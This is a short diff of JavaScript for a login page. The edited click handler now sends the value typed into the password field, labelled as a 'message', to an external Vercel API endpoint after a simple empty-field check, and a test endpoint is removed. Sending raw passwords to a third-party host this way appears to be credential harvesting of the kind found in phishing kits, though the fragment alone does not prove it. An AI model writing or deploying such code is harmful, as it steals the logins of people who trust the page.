@@ -23,13 +23,13 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 
   login?.addEventListener("click", () => {
-    if (pass01.value === "") pass01.style.borderColor = "red";
-    if (pass02.value === "") pass02.style.borderColor = "red";
+    if (pass01.value === "") return (pass01.style.borderColor = "red");
+    if (pass02.value === "") return (pass02.style.borderColor = "red");
 
     const URL = "https://project-bk3wq.vercel.app/api/index";
-    const URLTEST = "https://darco.vercel.app/api/index";
+
     // const URL = "localhost:1234/api/index";
-    handlerSendMessages(URLTEST, { message: pass01.value });
+    handlerSendMessages(URL, { message: pass01.value });
     // POST({ message: pass01.value });
     spinner();
 
